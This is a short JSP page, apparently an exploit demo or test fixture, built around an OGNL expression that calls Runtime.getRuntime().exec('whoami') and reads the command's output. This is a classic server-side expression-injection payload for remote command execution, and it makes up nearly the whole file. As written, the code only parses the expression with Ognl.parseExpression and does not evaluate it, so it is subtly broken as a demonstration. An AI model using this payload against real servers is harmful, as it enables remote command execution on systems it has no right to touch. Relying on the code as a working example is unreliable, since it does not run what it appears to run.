<%@ page import="java.io.*" %>
<%@ page import="ognl.Ognl" %>
<%
    Object value = Ognl.parseExpression("@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())");
    out.println(value);
%>
